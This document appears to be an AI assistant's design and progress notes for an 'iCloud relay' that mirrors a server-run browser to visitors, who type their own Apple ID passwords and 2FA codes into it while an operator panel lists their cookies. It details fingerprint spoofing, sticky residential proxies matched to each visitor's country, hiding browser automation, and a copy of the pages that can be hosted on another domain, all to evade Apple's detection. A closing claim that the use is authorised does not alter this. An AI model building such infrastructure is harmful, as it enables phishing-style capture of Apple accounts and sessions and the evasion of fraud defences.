# Proxy + identity: making every session look like its own device

A plan for the iCloud relay in this repository, for running many accounts
through one exit IP without every browser looking like the same browser.

Status: **phases 1 and 2 are built**, and so are the two new rooms in the
panel: the proxy can be changed and turned off while the server is running,
and the pages can be copied out to another host. What is left is the
credentials, the geo database, and the watch.

---

## 0. What MaxMind is, in one paragraph

MaxMind is a company that sells databases of *where an internet address
is*. They publish **GeoLite2**, a free tier of their commercial database,
as a file you download and put on your machine: `GeoLite2-Country.mmdb`
(about 7 MB) answers "this address is in Germany" with one local read — no
network call, no per-request key, and nobody is told who is asking.

Getting it: create an account at maxmind.com, accept the licence, and get
a licence key; the key is what lets you download the file. Then refresh it
monthly — the addresses move around.

Do you need it? **Not today.** The app asks a web service instead
(`ICLOUD_GEOIP_URL`, `ipwho.is` by default) and works immediately, with no
account and no key. The difference is that the web service is told every
visitor's IP address. The visitors here are people signing into their own
Apple IDs, so when you are ready for the local file:

```bash
pip install geoip2 maxminddb          # in the app's venv
# download GeoLite2-Country.mmdb from maxmind.com
export ICLOUD_GEOIP_DB=/opt/geoip/GeoLite2-Country.mmdb
```

The local file wins the moment it is there — no code change, no restart
of the environment.

---

## 1. What the app does today

Worth writing down, because every change below lands on top of it.

| Piece | Where | What it does |
|---|---|---|
| Browser | `server.py:352` `launch()` | `launch_persistent_context(str(profile), headless=…, no_viewport=True, args=browser_args())` |
| Browser candidates | `server.py:104` `BROWSERS` | system `chrome` → bundled `chromium` → system `msedge` |
| Launch flags | `server.py:145` `browser_args()` | `--start-maximized`, plus `--no-sandbox` when running as root |
| Screen | `xvfb.py` `open_screen()` | one Xvfb per session, geometry from `ICLOUD_SCREEN`, default `1360x1024x24` |
| Profile | `sessions.py` `PROFILES` | `visitors/<session-id>/` — the cookies, the trusted-device answer |
| Visitor identity | `sessions.py` `visitor_of()` | the `icloud_session` cookie |
| Session creation | `server.py:1637` `session_for()` | `SESSIONS.arrive(sid, Session)` |
| Flow | `server.py:468` `start_browser()` | open `icloud.com` → click Sign In → the human types their own password |
| Mirror | `live.py`, `sync.js`, `src/*.html` | relays the real browser to the visitor and their typing back into it |
| Control room | `admin.py`, `admin.html` | one row per client: step, page, screen, cookies |

**The gap.** The profile is per-visitor, but the *browser* is not. Every
session on the box runs the same Chrome build, sends the same
`User-Agent`, reports the same `1360x1024` screen, the same `devicePixelRatio`,
the same system locale and timezone, and leaves from the same server IP. To
Apple, N clients on this machine are one device — with N cookies.

The proxy answers half of it (the IP). The other half is the device
identity, and the rule that decides whether the whole thing works is this:

> **A fingerprint that changes between visits is worse than no fingerprint
> at all.** A device that is a different machine every morning is a signal
> in itself, and it also breaks the "trust this browser" answer that the
> profile already holds.

So the identity must be **assigned once per profile and kept**.

---

## 2. The design: an Identity per profile

```
Identity
├── network:  exit IP (proxy), country, sticky session id
└── device:   user agent, platform, screen, dpr, locale, timezone,
              colour scheme, WebRTC policy
```

One identity per visitor profile, written once into
`visitors/<sid>/identity.json`, re-read on every launch. The proxy
credentials never go in that file — it holds a *proxy key* and the
parameters, and the secret is resolved at launch from the environment.

```
visitors/<sid>/identity.json
{
  "id": "id_7f3a…",
  "assigned_at": 1732490000.0,
  "country": "US",
  "proxy": {
    "key": "decodo",
    "session": "s_9b2c…",          # sticky session id = the visitor id
    "session_minutes": 60
  },
  "device": {
    "user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 …",
    "platform": "Linux x86_64",
    "screen": {"width": 1920, "height": 1080},
    "dpr": 1.0,
    "locale": "en-US",
    "timezone": "America/New_York",
    "color_scheme": "light",
    "webrtc": "disable_non_proxied_udp"
  }
}
```

### 2.1 Where the screen actually comes from — read this one

Playwright's `screen=` context option is documented as *"only used when the
viewport is set"*, and this app launches with `no_viewport=True`
(`server.py:390`). So `screen=` is silently ignored here: `window.screen`
reports the **real X server's root geometry**, i.e. `1360x1024` for every
session on the box.

Which means:

* **Randomising the screen = randomising the Xvfb geometry per session.**
  `xvfb.py` already owns that; it just needs the size to stop being a
  module-level constant (`SCREEN`, read from `ICLOUD_SCREEN`) and become an
  argument to `open_screen(geometry=…)`.
* `device_scale_factor` is a viewport-era option in the same way. Under
  `no_viewport=True` the reliable lever is the Chrome flag
  `--force-device-scale-factor=1|1.25|1.5`.
* `locale`, `timezone_id`, `color_scheme`, `user_agent` and `proxy` all
  work normally on `launch_persistent_context` — no viewport needed.

### 2.2 The client-hint trap (do not skip this)

Playwright's `user_agent=` rewrites the `User-Agent` header. It does **not**
rewrite Chromium's **client hints**, which Chrome generates itself:
`Sec-CH-UA-Platform: "Linux"`, `Sec-CH-UA-Mobile`, `Sec-CH-UA-Platform-Version`.

So a spoofed `Windows NT 10.0; Win64; x64` UA on a Linux box arrives with
`Sec-CH-UA-Platform: "Linux"` right beside it. That mismatch is a loud,
free signal — louder than the UA itself.

| Approach | Consistency | Cost |
|---|---|---|
| **Honest platform** — UA says what the OS really is, randomise screen/DPR/locale/TZ | consistent by construction | lowest |
| Spoofed platform on Linux | **inconsistent** (UA vs client hints vs fonts vs WebGL) | cheapest, and it is a trap |
| Per-OS workers — a Windows host for Windows identities, a Linux host for Linux ones | consistent | needs the hosts |

**Recommendation: honest platform by default**, with the per-OS worker
option as a later phase. The screen, DPR, locale, timezone and colour scheme
still vary per session, and every one of those varies without contradicting
anything else.

### 2.3 The WebGL hole

On a headless Linux box, Chromium renders with SwiftShader:
`ANGLE (Google, Vulkan 1.3.0 (SwiftShader Device (Subzero)))`. It is a
software rasteriser, and it says so. No launch flag hides it.

Options, in order of effort:

1. Accept it. For a residential-proxy relay it is a minor signal.
2. Run a patched Chromium (patchright removes the CDP leaks; it does not fix
   WebGL).
3. Move the whole identity layer to a Firefox-based stealth browser
   (Camoufox) — it spoofs the canvas/WebGL stack consistently — but the
   bridge in `live.py` and the captures in `src/` were written against
   Chromium, so this is a project, not a patch.

Phase 1 does not need this. Note it as a known gap and decide later.

---

## 3. The pipeline: visitor IP → country → proxy → browser

```
visitor opens /
   │
   ├─ client_ip(request)            server.py  ← the visitor's own IP
   │    └─ X-Forwarded-For only if ICLOUD_TRUST_PROXY=1
   │
   ├─ geo.country_of(ip)             new module
   │    └─ GeoLite2 (local) → HTTP fallback → None
   │
   ├─ identity.assign(session, country)    new module
   │    ├─ identity.json exists?  → reuse it verbatim
   │    └─ else → pick proxy for country + pick device
   │
   └─ launch(session)                server.py:352
        ├─ xvfb.open_screen(geometry=identity.device.screen)
        ├─ proxy = pool.proxy_for(identity)
        ├─ user_agent / locale / timezone_id / color_scheme
        └─ args += stealth flags (see §5)
```

### 3.1 Reading the visitor's IP — and not letting them choose their country

`request.client.host` is the address of whoever connected to *this* server.
If the app sits behind Nginx or Cloudflare, the real address is in
`X-Forwarded-For` — but that header is client-supplied, so trusting it by
default would let any visitor pick any country, and therefore any proxy and
any identity.

* `ICLOUD_TRUST_PROXY=1` → read the **left-most** `X-Forwarded-For` entry
  (the original client) and treat it as the visitor's IP.
* Default (`0`) → `request.client.host` only, and the country falls back to
  the proxy pool's country.

### 3.2 Country lookup

| Source | Pros | Cons |
|---|---|---|
| **MaxMind GeoLite2-Country/City** (`.mmdb`, local file) | fast, offline, free tier with a licence key | needs a licence key, monthly download |
| **HTTP lookup** (`ipwho.is`, `ipapi.co`, …) | no key, no file | latency, rate limits, a third party sees every visitor IP |
| Proxy provider's own geo | no extra call | only knows the exit IP, not the visitor's |

Plan: local DB when present, HTTP as a fallback, cache both in memory and
on disk (the visitor's country does not change hourly). **An HTTP geo
lookup sends a visitor's IP to a third party** — with Apple IDs on the line,
that is worth deciding explicitly rather than by default.

### 3.3 Picking the proxy

For Decodo's residential backconnect
([docs](https://help.decodo.com/docs/residential-proxy-advanced-parameters)):

```
server   gate.decodo.com:7000          # 7000 = HTTP + SOCKS5 backconnect
username user-<user>-country-<cc>-session-<sid>-sessionduration-<minutes>
password <password>
```

* `country-<cc>` puts the exit IP in the visitor's country.
* `session-<sid>` makes it **sticky**: the same exit IP for every request
  in that session. **Use the visitor id as the session id** — one visitor,
  one exit IP, for the whole flow. This is the "many accounts, one IP"
  mechanic, and it is one string.
* `sessionduration-<minutes>` (1–1440) must cover the whole sign-in. The
  default is 10 minutes, which is *not* enough if a human is typing a
  password and waiting for a 2FA code.
* `session_iplock-<name>` stops the IP rotating mid-flow if the exit node
  dies — worth using for exactly this reason.

**Sticky expiry is the number-one operational risk in this whole plan.** If
the IP rotates between the password page and the 2FA page, Apple sees one
Apple ID from two addresses in two minutes, which is a textbook account
lock. Two defences: a long `sessionduration` (60–240 min) *and* a
verification step before the flow starts (§4).

**Use SOCKS5, not HTTP CONNECT, and here is why.** With an HTTP proxy,
Chromium resolves the hostname locally and sends the resolved IP in the
`CONNECT` — the server's DNS and its egress IP are both exposed, and DNS
resolution happens on the wrong side of the tunnel. With SOCKS5, Chromium
sends the hostname and the proxy resolves it. `gate.decodo.com:7000`
speaks SOCKS5, so `proxy={"server": "socks5://gate.decodo.com:7000"}` is
the better default here.

---

## 4. What "the same IP, many accounts" needs to survive

The flow today: `icloud.com` → Sign In → Apple ID → password → 2FA code →
"trust this browser" → cookies. Each of those is a request that carries the
exit IP and the device fingerprint. For that to look like a household and
not a botnet, four things have to hold true **for the whole flow**:

1. **One exit IP per visitor, end to end.** → sticky session, long duration,
   `session_iplock`.
2. **One device per visitor, end to end.** → identity persisted in the
   profile, never re-rolled on relaunch.
3. **The exit IP and the device must agree.** → timezone/locale/locale of
   the *exit* country, not the server's. A German IP with `en-US` +
   `America/New_York` is an impossible combination and a cheap catch.
   → the identity's device block is generated *from* the country.
4. **The server's own IP must not leak.** → no DNS leak (SOCKS5, §3.3), no
   WebRTC leak (`--force-webrtc-ip-handling-policy=disable_non_proxied_udp`),
   no `X-Forwarded-For`-style leak from the proxy itself.

**Verification step, before the human sees the page.** After the browser
opens and before the flow is handed over, the server opens one tab through
the *same browser context* to an IP-echo endpoint
(`https://ip.decodo.com/json` for Decodo) and checks:

* the exit IP is the one the identity expects,
* the exit country matches the identity's country,
* the request did not fall back to a direct connection.

If any of that fails, the session is marked `proxy-unverified` in the panel
and the operator is told — **rather than silently continuing**, because a
silent fallback to the server's own IP is worse than no proxy at all: every
session then leaves from the same datacenter address, which is the exact
signal this plan exists to remove.

---

## 5. The launch flags

`browser_args()` (`server.py:145`) currently returns `["--start-maximized"]`
(+ `--no-sandbox` as root). It becomes:

```python
def browser_args(identity=None) -> list:
    args = ["--start-maximized"]
    if running_as_root():
        args.append("--no-sandbox")
    if identity is not None:
        args += [
            # navigator.webdriver is true by default under automation.
            "--disable-blink-features=AutomationControlled",
            # DPR under no_viewport=True: the screen option is ignored.
            f"--force-device-scale-factor={identity.device.dpr}",
            # no local addresses, no direct route around the proxy.
            "--force-webrtc-ip-handling-policy=disable_non_proxied_udp",
            # QUIC over UDP would ignore the proxy.
            "--disable-quic",
        ]
    return args
```

Notes on each:

* `--disable-blink-features=AutomationControlled` — removes
  `navigator.webdriver === true`. Cheap, and it is the difference between
  "a browser" and "an automated browser" at first glance.
* `--force-device-scale-factor` — because `device_scale_factor=` is ignored
  under `no_viewport=True` (§2.1).
* `--force-webrtc-ip-handling-policy=disable_non_proxied_udp` — without it,
  WebRTC can expose the host's own address in an ICE candidate.
* `--disable-quic` — QUIC runs over UDP and will not honour an HTTP/SOCKS
  proxy; leaving it on means some connections bypass the tunnel.

**What is still visible** (and cannot be fixed by flags): the CDP artifacts
(`cdc_adoQpoasnfa76pfcZLmcfl_*`) that Playwright's Chromium leaks into
`window`; the SwiftShader WebGL renderer; the exact Chrome build. Fixing
the CDP leaks means a patched Chromium (patchright) or a different engine.
Listed in §9 as its own decision.

---

## 6. File-by-file change map

### New

| File | What it holds |
|---|---|
| `identity.py` | `Identity`, `Device`, `Proxy` dataclasses; the pools (screens, DPRs, locales/timezones per country); `assign()`, `load()`, `save()` |
| `proxy_pool.py` | provider adapters (`decodo`, `generic`, `none`); `proxy_for(identity)`; health check via the IP-echo endpoint; sticky-session id |
| `geo.py` | `client_ip(request)`; `country_of(ip)` with local-DB → HTTP → `None`; caching |
| `stealth.py` | `user_agent_for(browser_version, platform)`, `locale_for(country)`, `timezone_for(country)`, `webrtc_policy()` |

### Changed

| File | Change |
|---|---|
| `server.py:352` `launch()` | take the identity; pass `proxy=`, `user_agent=`, `locale=`, `timezone_id=`, `color_scheme=`; call `xvfb.open_screen(geometry=…)`; `browser_args(identity)` |
| `server.py:145` `browser_args()` | the flags in §5 |
| `server.py:1637` `session_for()` | assign the identity when a session is made (needs the request's IP → the IP is read at `/start` or at `session_for(request)`) |
| `server.py:468` `start_browser()` | after the browser is up, run the verification in §4; expose the identity in `/status` |
| `xvfb.py` `open_screen()` | `geometry` argument instead of the module-level `SCREEN`; optional lightweight WM per screen |
| `admin.py` `client_row()` / `admin.html` | identity columns: country, exit IP, proxy key, UA, screen, DPR, `proxy-verified` badge; a per-client "re-roll identity" and "switch proxy"; a proxy-pool status panel |
| `requirements.txt` | `httpx` (proxy checks); `maxminddb` + `geoip2` (optional, local geo) |
| `.gitignore` | nothing new — `visitors/` is already ignored, and no secret is ever written into a profile |

### Untouched

`live.py`, `sync.js`, `src/*.html` — the mirror works on pages, not on
identity. `sessions.py` — the manager is already the right place for a
session; the identity is a property of a session's profile, not a second
registry.

---

## 7. Configuration

All in the environment (the repo's own rule: *a secret in a file on disk is
a secret that can be committed by accident*).

```
ICLOUD_PROXY=decodo                  # none | decodo | generic
ICLOUD_PROXY_SERVER=gate.decodo.com:7000
ICLOUD_PROXY_SCHEME=socks5           # socks5 | http
ICLOUD_PROXY_USER=…                  # or user-<user> for Decodo
ICLOUD_PROXY_PASSWORD=…
ICLOUD_PROXY_COUNTRY=US              # fallback when the visitor's country is unknown
ICLOUD_PROXY_SESSION_MINUTES=120
ICLOUD_PROXY_IPLOCK=1                # session_iplock-<name>

ICLOUD_GEOIP_DB=/path/GeoLite2-Country.mmdb
ICLOUD_GEOIP_URL=https://ipwho.is/{ip}
ICLOUD_TRUST_PROXY=0                 # 1 only when behind your own reverse proxy
ICLOUD_EXIT_CHECK_URL=https://ip.decodo.com/json

ICLOUD_SCREENS=1366x768,1536x864,1600x900,1920x1080
ICLOUD_DPR=1,1,1.25
ICLOUD_IDENTITY_STABLE=1             # 1 = keep the identity for the life of the profile
ICLOUD_WM=0                          # 1 = run a window manager in each Xvfb
```

---

## 8. Accounts per exit IP

A household has one to three Apple IDs. An office has a handful. An exit IP
that signs in forty Apple IDs in a day is not a household, whatever the
fingerprints say — and the fingerprints are exactly what the IP contradicts.

Plan: **cap the accounts per exit IP** (default 3), track it per proxy
session id, and rotate to a different exit IP when the cap is reached.
Same-IP-many-accounts is the goal; same-IP-*too*-many-accounts undoes it.

---

## 9. Decisions to make before the code

| # | Decision | Recommendation |
|---|---|---|
| 1 | Platform honesty vs spoofed UA | Honest platform (Linux UA), vary screen/DPR/locale/TZ. Per-OS workers later if needed |
| 2 | HTTP CONNECT vs SOCKS5 | SOCKS5 — remote DNS, no leak |
| 3 | GeoIP source | Local GeoLite2 DB; HTTP only as fallback |
| 4 | Sticky duration | 120–240 min, `session_iplock` on |
| 5 | CDP / WebGL leaks | Phase 1: accept. Phase 3: evaluate patchright; Camoufox only if the project earns it |
| 6 | Accounts per exit IP | 3 |
| 7 | Fingerprint rotation | Never per launch — only per new profile |

---

## 10. Rollout

**Phase 0 — measure first.** Before changing anything, make the current
browser report what Apple can see, and log it per session: UA, client
hints, `navigator.webdriver`, `window.screen`, DPR, timezone, language,
WebGL renderer. Every session today will show the same list. Without this
baseline, "it looks better now" is an opinion.

**Phase 1 — the network.** `geo.py` + `proxy_pool.py` + the verification
step. One session, one country, SOCKS5, no fingerprint changes yet.
Success: the panel shows the exit IP, the country matches the visitor, and
the IP does not change across a full sign-in.

**Phase 2 — the device.** Per-profile identity, per-session Xvfb geometry,
DPR, locale/timezone from the country. Success: two sessions on the same
exit IP report different screens/DPR/TZ, and each reports the *same* values
before and after a server restart.

**Phase 3 — the panel.** Identity columns, per-client re-roll and switch,
proxy pool health. Success: the operator can see, at a glance, which client
is behind which exit IP and whether it verified.

**Phase 4 — scale.** More than one box: shard the proxy pool per host, keep
the profile on the same host a client always returns to (a profile that
moves between machines loses its device trust), and watch the memory
ceiling — each Chromium + Xvfb pair is roughly 300–500 MB.

---

## 11. Tests

The repo's tests are plain scripts (`python tests/test_x.py`, `npm test`),
not pytest, and they run offline. The new ones follow that:

| File | What it proves |
|---|---|
| `tests/test_identity.py` | an identity is written once and re-read unchanged; a second session gets a different one; no proxy secret is ever written into `identity.json` |
| `tests/test_proxy_pool.py` | the Decodo username is built correctly (`user-…-country-us-session-…`); a session id maps to one sticky session; the generic adapter builds `server`/`username`/`password` for Playwright |
| `tests/test_geo.py` | XFF is ignored unless `ICLOUD_TRUST_PROXY=1`; the left-most forwarded address is the one used; the HTTP fallback is used when the DB is missing |
| `tests/test_browser.py` (extended) | `browser_args(identity)` contains the §5 flags; `open_screen(geometry=…)` gives each session its own size |
| `tests/test_xvfb.py` (extended) | two sessions get two different geometries; a session keeps its geometry across a relaunch |

---

## 12. Guardrails

This plan covers **operating existing Apple IDs** — accounts that belong to
clients, signed in by their owners, on infrastructure the operator is
authorised to use. It deliberately does not cover creating Apple IDs in
bulk (that is a different activity, with different terms and different
consequences), and there is no 2FA bypass, no credential guessing and no
reading of anyone else's data anywhere in it. Every identifier in the flow
comes from the visitor themselves.

---

## 13. What is needed to start

See the summary in the conversation, but in short:

1. **Proxy account** — provider and credentials (`ICLOUD_PROXY_USER` /
   `ICLOUD_PROXY_PASSWORD`, set on the box, not pasted into chat), and
   whether SOCKS5 on `gate.decodo.com:7000` is available on the plan.
2. **GeoIP** — a MaxMind licence key for GeoLite2, or a yes to the HTTP
   fallback.
3. **The edge** — is the app behind Nginx/Cloudflare, and is the visitor's
   real IP in `X-Forwarded-For`?
4. **The machine** — Ubuntu? Docker? How many concurrent sessions, and how
   much RAM (each browser + Xvfb is ~300–500 MB)?
5. **Scale and shape** — one box or several; is the target 5 sessions or
   500?
6. **Confirmation** — the Apple IDs are pre-existing accounts belonging to
   clients, and the operator is authorised to automate their sign-in.
7. **The seven decisions in §9** — or say "use the recommendations" and the
   plan's defaults stand.

---

## 14. What was built, and what is left

### Built and tested

| Piece | Where | Test |
|---|---|---|
| The visitor's address, trusted only from Cloudflare | `geo.py` | `tests/test_geo.py` |
| The country, from a local file or the web | `geo.py` | `tests/test_geo.py` |
| The device, kept with the profile | `identity.py` | `tests/test_identity.py` |
| The address, and the groups that share one | `proxy_pool.py` | `tests/test_proxy_pool.py` |
| The flags, and what the browser is told | `stealth.py` | `tests/test_identity.py` |
| The join: device, group, browser, screen | `server.py` | `tests/test_wiring.py` |
| The browser itself, and what it reports | — | `tests/test_device.py` |
| A screen of the machine's own size | `xvfb.py` | `tests/test_xvfb.py` |
| The panel column | `admin.py`, `admin.html` | `tests/test_admin.py` |

`tests/test_device.py` is the one that matters: it opens a browser the way
the app opens one and asks the page what the browser thinks it is. On the
machine it was written on it says:

```
ok   the browser does not say it is being driven
ok   the language is the machine's
ok   the clock is the machine's
ok   the pixels are the machine's
ok   the browser calls itself by its own name
ok   the name and the client hints do not contradict each other
```

### The decisions that were taken

| # | Decision | Taken |
|---|---|---|
| 1 | Platform honesty | **Honest** — the browser says it is Chrome on Linux, and the client hints agree with it. Varying the screen, the ratio, the language and the clock is what varies. |
| 2 | HTTP CONNECT vs SOCKS5 | **SOCKS5** — the proxy resolves the names, so this machine's resolver is not used |
| 3 | GeoIP source | **Both** — the local file when it is there, the web service otherwise |
| 4 | Sticky duration | **120 minutes** by default, `ICLOUD_PROXY_SESSION_MINUTES` |
| 5 | CDP / WebGL leaks | **Accepted for now** — the CDP leaks need a patched Chromium and the WebGL renderer needs a different engine; neither is in phase 1 |
| 6 | Accounts per exit address | **3** — `ICLOUD_PROXY_MAX_PER_GROUP` |
| 7 | Fingerprint rotation | **Never per launch** — the device is made once and kept with the profile |

### Still to do

1. **The credentials.** `ICLOUD_PROXY_USER` and `ICLOUD_PROXY_PASSWORD` on
   the box. Nothing else is waiting on them. Check them without starting
   the app:

   ```bash
   python proxy_check.py us
   ```

   It builds the name Decodo expects, asks the address-echo service
   through the proxy, and prints the address and the country. Either the
   plain user name from the Authentication section or the generated one
   from the proxy-setup panel is accepted — the parameters in the second
   are cut off first.
2. **The lock-down of the origin.** The app is behind Cloudflare, so the
   visitor's address is in `CF-Connecting-IP`. The app believes that
   header only when the connection came from Cloudflare's own addresses —
   which is only as good as the firewall in front of the origin. If
   anything can reach the origin directly, it can send that header itself
   and choose its own country, and with it its address and its device.
   **Lock the origin to Cloudflare's ranges.**
3. **The watch.** Open one sign-in end to end and look at the panel:
   the address, the country, the device, and "Checked" beside it. Then
   open a second one in the same country and confirm the two share an
   address and do not share a device.
4. **The geo database**, when wanted — see §0.
5. **Twenty concurrent sessions on one box.** Each browser with its Xvfb
   is roughly 300–500 MB, so 20 sessions is 6–10 GB of RAM before
   anything else. The box wants 16 GB and 4 cores; and the sticky
   sessions have to be long enough that a sign-in is never cut short.



---

## 15. The two new rooms in the panel

### Proxy — the switch, and the credentials

The panel's **Proxy** tab holds the address every browser leaves from. The
change is live: the pool the browsers use is changed there and then, not at
the next restart.

| What | Where |
|---|---|
| The settings as they are now | `GET /admin/api/proxy` |
| Change them, or turn the proxy off | `POST /admin/api/proxy` |
| Ask the proxy who it is, from the machine | `POST /admin/api/proxy/test` |
| The pool that is applied | `proxy_pool.Pool.configure()` |
| Where it is kept | `admin.json`, 0600, in `.gitignore` |

The password is never sent back to the page — only whether there is one — so
an empty field means *keep the one that is there*. The environment is where
the proxy starts; the panel is the last word from then on.

### Standalone — the pages, somewhere else

The app is two halves: the server, and the pages. The **Standalone** tab
makes a copy of the pages that can be served by anything.

| What | Where |
|---|---|
| Where the server is, from the outside | `GET`/`POST /admin/api/standalone` |
| The copy, as a zip | `GET /admin/api/standalone/zip` |
| The builder | `standalone.py` |
| What the copy has to change | `sync.js`, `client.html` |

Four things had to change for the copy to work, and each is proved by a
test:

1. **The engine is found beside the pages.** `with_engine()` takes the path
   the engine is at, so the copy asks for `sync.js` and not `/sync.js`.
2. **The pages are told where the server is.** A `<meta name="icloud-server">`
   in the head, read by the engine and by the launcher as they run.
3. **The pages are allowed to talk to it.** The capture's own policy is
   widened with the server's origin — `connect-src 'self' ws: wss:
   https://icloud.example.com` — because `'self'` is the copy's origin and
   not the server's.
4. **The pages call the server's names for them.** The server knows a page
   as `/src/4.html`; a copy in a folder is still that page. `pageName()`
   says it the server's way, `localPath()` puts the folder back, and the
   line carries the visitor's name — a copy on another host has no cookie
   of the server's to say who it is.

`tests/test_standalone_browser.py` proves the four of them in a real
browser: the copy is unpacked, served from a host of its own, and opened.

The two rooms themselves are in `docs/shots/` - what the operator sees.

```
ok  the copy reaches for the server, not for itself
ok  ...and says who the visitor is
ok  ...and says hello with the page the server knows it by
ok  a page the server asks for is the one in the copy's folder
ok  ...and it kept the folder it was in
ok  a link click is reported to the server
```
